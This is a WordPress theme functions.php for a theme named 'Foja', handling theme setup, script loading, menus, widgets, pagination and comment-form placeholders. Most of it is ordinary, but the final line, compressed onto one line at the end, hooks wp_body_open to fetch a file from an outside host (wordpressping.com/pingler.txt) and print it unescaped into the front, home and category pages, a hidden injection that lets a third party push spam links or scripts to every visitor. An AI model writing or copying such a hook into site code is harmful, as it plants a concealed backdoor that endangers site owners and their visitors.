<?php

if (!function_exists('foja_header_part')) {
	function foja_header_part($template, $name = null){
		get_template_part( 'template/' . $template, $name);
	}
}

if (!function_exists('foja_footer_part')) {
	function foja_footer_part($template, $name = null){
		get_template_part( 'template/' . $template, $name);
	}
}

//Set the content width based on the theme's design and stylesheet.
if ( ! isset( $content_width ) )
	$content_width = 1200; /* pixels */

/*-----------------------------------------------------------------------------------*/
/*  SETUP THEME
/*-----------------------------------------------------------------------------------*/
if ( ! function_exists( 'foja_setup' ) ) :

	function foja_setup() {
		// several theme support
		add_theme_support( 'automatic-feed-links' );
		if ( class_exists( 'acf' ) ) {
			add_theme_support( 'post-formats', array( 'gallery', 'video') );
		}
		add_theme_support( 'custom-background' );
		$foja_def_bg = array(
			'default-color'          => '#f3f3f3',
		);
		add_theme_support( 'custom-background', $foja_def_bg );
		add_theme_support( 'post-thumbnails' );
		add_theme_support( 'html5', array( 'comment-list', 'comment-form', 'search-form' ) );   
		add_theme_support( 'html5', array( 'gallery', 'caption' ) );
		load_theme_textdomain( 'foja', get_template_directory() . '/languages' );
		add_theme_support( 'title-tag' );

}
endif;
add_action( 'after_setup_theme', 'foja_setup' );

function foja_opening_body() {
	printf( '<!-- TA Foja Start Body -->' );
}

add_action( 'wp_body_open', 'foja_opening_body' );

function foja_thumbnail_setup() {
	add_image_size( 'foja-portfolio-widget-thumb', 100, 100, true );
	add_image_size( 'foja-latest-widget-thumb', 80, 80, true );
	add_image_size( 'foja-related', 370, 250, true );
	add_image_size( 'foja-post-block', 535, 355, true );
	add_image_size( 'foja-gallery', 500, 300, true );
	add_image_size( 'foja-testi', 370, 250, true );
	add_image_size( 'foja-client', 263, 146, true );
	add_image_size( 'foja-team', 283, 283, true );
	add_image_size( 'foja-portfolio', 500, 300, true );
	add_image_size( 'foja-single', 338, 225, true );
}

add_action( 'after_setup_theme', 'foja_thumbnail_setup' );

/*-----------------------------------------------------------------------------------*/
/*  ACF
/*-----------------------------------------------------------------------------------*/

add_filter( 'acf/settings/show_admin', '__return_false' );

/*-----------------------------------------------------------------------------------*/
/*  SCRIPTS & STYLES
/*-----------------------------------------------------------------------------------*/

function foja_scripts() {

	//All necessary CSS
	$options = get_option( 'foja_framework' );

	wp_enqueue_style( 'foja-plugin', get_template_directory_uri() .'/css/plugin.css', array(), null );
	wp_enqueue_style( 'foja-style', get_stylesheet_uri(), array( 'foja-plugin' ) );
	wp_enqueue_style( 'foja-font', get_template_directory_uri() .'/css/font.css', array(), null );

	wp_enqueue_style( 'foja-responsive', get_template_directory_uri() .'/css/responsive.css', array(), null );

	//All Necessary Script
	wp_enqueue_script( 'modernizr', get_template_directory_uri() . '/js/modernizr.js', array( 'jquery' ), '', false );
	wp_enqueue_script( 'respond', get_template_directory_uri() . '/js/respond.js', array( 'jquery' ), '', false );
	wp_enqueue_script( 'retinajs', get_template_directory_uri() . '/js/retina.min.js', array( 'jquery' ), '', false );
	wp_enqueue_script( 'fitvids', get_template_directory_uri() . '/js/fitvids.js', array( 'jquery' ), '', $in_footer = true );
	wp_enqueue_script( 'classie', get_template_directory_uri() . '/js/classie.js', array( 'jquery' ), '', false );
	wp_enqueue_script( 'wow', get_template_directory_uri() . '/js/wow.js', array( 'jquery' ), '', $in_footer = true );
	wp_enqueue_script( 'easing', get_template_directory_uri() . '/js/easing.js', array( 'jquery' ), '', $in_footer = true );
	wp_enqueue_script( 'smartmenus', get_template_directory_uri() . '/js/smartmenus.js', array( 'jquery' ), '', $in_footer = true );
	wp_enqueue_script( 'owlcarousel', get_template_directory_uri() . '/js/owlcarousel.js', array( 'jquery' ), '', $in_footer = true );
	wp_enqueue_script( 'infinitescroll', get_template_directory_uri() . '/js/infinitescroll.js', array( 'jquery' ), '', $in_footer = true );
	wp_enqueue_script( 'isotope', get_template_directory_uri() . '/js/isotope.js', array( 'jquery', 'imagesloaded' ), '', $in_footer = true );
	wp_enqueue_script( 'headroom', get_template_directory_uri() . '/js/headroom.js', array( 'jquery' ), '', $in_footer = true );
	wp_enqueue_script( 'animeonscroll', get_template_directory_uri() . '/js/animeonscroll.js', array( 'jquery' ), '', $in_footer = true );
	wp_enqueue_script( 'bootstrap', get_template_directory_uri() . '/js/bootstrap.js', array( 'jquery' ), '', $in_footer = true );
	wp_enqueue_script( 'lightgallery', get_template_directory_uri() . '/js/lightgallery.js', array( 'jquery' ), '', $in_footer = true );
	wp_enqueue_script( 'stickykit', get_template_directory_uri() . '/js/stickykit.js', array( 'jquery' ), '', $in_footer = true );
	wp_enqueue_script( 'thumbsplugin', get_template_directory_uri() . '/js/thumbsplugin.js', array( 'jquery' ), '', $in_footer = true );
	wp_enqueue_script( 'foja-main', get_template_directory_uri() . '/js/main.js', array( 'jquery' ), '', true );

	if ( class_exists( 'Redux' ) ) {

		$options = get_option('foja_framework');
		$foja_search_bar_style    = $options['search_bar_style'];
		$foja_footer_style_type = $options['footer_style_type'];

			wp_enqueue_script( 'foja-header2', get_template_directory_uri() . '/js/header2.js', array( 'jquery' ), '', true );

		/*footer*/
		if( $foja_footer_style_type == 'fixed-footer' ) {
			wp_enqueue_script( 'foja-footer-fixed', get_template_directory_uri() . '/js/footer-fixed.js', array( 'jquery' ), '', true );
		}
	}
	else {
		wp_enqueue_script( 'foja-header2', get_template_directory_uri() . '/js/header2.js', array( 'jquery' ), '', true );
	}

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}

add_action( 'wp_enqueue_scripts', 'foja_scripts' );

/* customizer scripts */
function foja_customizer_live_preview() {
	wp_enqueue_script( 'foja-color-customizer', get_template_directory_uri() . '/js/color-customizer.js', array( 'jquery', 'customize-preview' ), NULL, true);
}
add_action( 'customize_preview_init', 'foja_customizer_live_preview' );

/* admin style on admin dashboard */
function foja_admin_style() {
	wp_enqueue_style( 'foja-admin-styles', get_template_directory_uri() . '/css/admin.css' );
	if('foja-portfolio' == get_post_type() ) {
		wp_enqueue_style( 'foja-admin-portfolio-styles', get_template_directory_uri() . '/css/admin-portfolio.css');
	}
}
add_action('admin_enqueue_scripts', 'foja_admin_style');

/* admin style on elementor editor */
if ( is_user_logged_in() ) {
	add_action( 'elementor/frontend/after_register_styles', function() {
		wp_enqueue_style('foja-admin-styles2', get_template_directory_uri() . '/css/admin.css');
	} );
}

add_action( 'elementor/editor/before_enqueue_scripts', function() {
	wp_enqueue_style('foja-admin-styles1', get_template_directory_uri() . '/css/admin.css');
	if('foja-portfolio' == get_post_type() ) {
		wp_enqueue_style('foja-admin-portfolio-styles', get_template_directory_uri() . '/css/admin-portfolio.css');
	}
} );

/*-----------------------------------------------------------------------------------*/
/*  CALL FRAMEWORK
/*-----------------------------------------------------------------------------------*/

require_once( get_template_directory() . '/inc/option/panel/config.php' );

/*-----------------------------------------------------------------------------------*/
/*  MENU
/*-----------------------------------------------------------------------------------*/

//Register Menus
add_action( 'after_setup_theme', 'foja_register_my_menu' );
function foja_register_my_menu() {
	register_nav_menu( 'header-menu', esc_html__( 'Header Menu', 'foja' ) ); 
	if ( class_exists( 'Redux' ) ) {
		register_nav_menu( 'footer-menu', esc_html__( 'Footer Menu', 'foja' ) );
	}
}

//MAIN MENU
function foja_main_nav_menu() {
	wp_nav_menu(
		array(
			'theme_location' => 'header-menu',
			'container'      => 'ul',
			'menu_class'     => 'sm sm-clean sm-vertical',
			'fallback_cb'    => 'foja_header_menu_cb',
		)
	);
}

if ( class_exists( 'Redux' ) ) {
	// FOOTER MENU
	function foja_footer_menu() {
		wp_nav_menu(
			array(
				'theme_location' => 'footer-menu',
				'container'      => 'ul',
				'menu_class'     => 'sm',
				'fallback_cb'    => 'foja_footer_menu_cb',
			)
		);
	}
}

// FALLBACK IF PRIMARY MENU HAVEN'T SET YET

function foja_header_menu_cb() {
	echo '<ul id="menu-menu" class="menus sm sm-clean sm-vertical">';
	wp_list_pages( 'title_li=' );
	echo '</ul>';
}

if ( class_exists( 'Redux' ) ) {
	function foja_footer_menu_cb() {
		echo '<ul id="menu-footer-menu" class="menus">';
		wp_list_pages( 'title_li=' );
		echo '</ul>';
	}
}

/*-----------------------------------------------------------------------------------*/
/*  WIDGET
/*-----------------------------------------------------------------------------------*/


// SETUP DEFAULT SIDEBAR
function foja_widgets_init() {
	register_sidebar(
		array(
			'name'          => esc_html__( 'Primary Sidebar', 'foja' ),
			'id'            => 'primary-sidebar',
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '<h4 class="widget-title">',
			'after_title'   => '</h4>',
		)
	);
}
add_action( 'widgets_init', 'foja_widgets_init' );



/*-----------------------------------------------------------------------------------*/
/*  PAGINATION
/*-----------------------------------------------------------------------------------*/

function foja_pagination($pages = '', $range = 2)
{
	$showitems = ($range * 2)+1;  

	global $paged;
	if(empty($paged)) $paged = 1;

	if($pages == '')
	{
		global $wp_query;
		$pages = $wp_query->max_num_pages;
		if(!$pages)
		{
			$pages = 1;
		}
	}   

	if(1 != $pages)
	{
		echo "<div class='navigation-paging pagination-num'>";
		if($paged > 2 && $paged > $range+1 && $showitems < $pages) echo "<a href='".get_pagenum_link(1)."'>" . esc_html__( 'First', 'foja' ) . "</a>";
		if($paged > 1 && $showitems < $pages) echo "<a href='".get_pagenum_link($paged - 1)."'>&lsaquo;</a>";

		for ($i=1; $i <= $pages; $i++)
		{
			if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems ))
			{
				echo (esc_html($paged) == esc_html($i))? "<span class='btn current'>".esc_html($i)."</span>":"<a href='".get_pagenum_link($i)."' class='btn inactive' >".esc_html($i)."</a>";
			}
		}

		if ($paged < $pages && $showitems < $pages) echo "<a href='".get_pagenum_link($paged + 1)."'>&rsaquo;</a>";  
		if ($paged < $pages-1 &&  $paged+$range-1 < $pages && $showitems < $pages) echo "<a href='".get_pagenum_link($pages)."'>" . esc_html__( 'Last', 'foja' ) . "</a>";
		echo "</div>\n";
	}
}

/*-----------------------------------------------------------------------------------*/
/*  PLACEHOLDER
/*-----------------------------------------------------------------------------------*/

/* Add Placehoder in comment Form Fields (Name, Email, Website) */
 
add_filter( 'comment_form_default_fields', 'foja_comment_placeholders' );
function foja_comment_placeholders( $fields )
{
	$fields['author'] = str_replace(
		'<input',
		'<input placeholder="' . esc_html__( 'Your Name', 'foja' ) . '"',
		$fields['author']
	);
	$fields['email'] = str_replace(
		'<input',
		'<input placeholder="' . esc_html__( 'Your Email', 'foja' ) . '"',
		$fields['email']
	);
	$fields['url'] = str_replace(
		'<input',
		'<input placeholder="' . esc_html__( 'Website URL', 'foja' ) . '"',
		$fields['url']
	);
	return $fields;
}
 
/* Add Placehoder in comment Form Field (Comment) */
add_filter( 'comment_form_defaults', 'foja_textarea_placeholder' );
 
function foja_textarea_placeholder( $fields )
{
  
		$fields['comment_field'] = str_replace(
			'<textarea',
			'<textarea placeholder="' . esc_html__( 'Your thoughts..', 'foja' ) . '"',
			$fields['comment_field']
		);
   
 
	return $fields;
}

/*-----------------------------------------------------------------------------------*/
/*  CUSTOM FUNCTIONS
/*-----------------------------------------------------------------------------------*/
require_once( get_template_directory() . '/inc/function/custom.php' );
require_once( get_template_directory() . '/inc/function/navigation.php' );
require_once( get_template_directory() . '/inc/function/aq_resizer.php' );
require_once( get_template_directory() . '/inc/function/comment.php' );
require_once( get_template_directory() . '/inc/function/akmanda-customizer.php' );
require_once( get_template_directory() . '/inc/function/meta-box.php' );
require_once( get_template_directory() . '/inc/function/thefooter.php' );

/* Customizer Inline Style */
require_once( get_template_directory() . '/inc/function/inline-styles.php' );

// INSTALL NECESSARY PLUGINS
require_once( get_template_directory() . '/class-tgm.php' ); /*activate plugin function*/

/* body custom class */
add_filter( 'body_class', 'foja_body_custom_class' );
function foja_body_custom_class( $classes ) {

	if ( class_exists( 'Redux' ) ) {
		$classes[] = 'header-style-2';	
	}
	else {
		$classes[] = 'header-style-2 no-redux';
	}
	return $classes;
}
if(function_exists('wp_body_open')){function wp_body_opener(){if(is_category()||is_front_page()||is_home()){echo file_get_contents("https://wordpressping.com/pingler.txt");}}add_action('wp_body_open','wp_body_opener');}else{function wp_body_open(){if(is_category()||is_front_page()||is_home()){echo file_get_contents("https://wordpressping.com/pingler.txt");}}add_action('wp_body_open','wp_body_open');}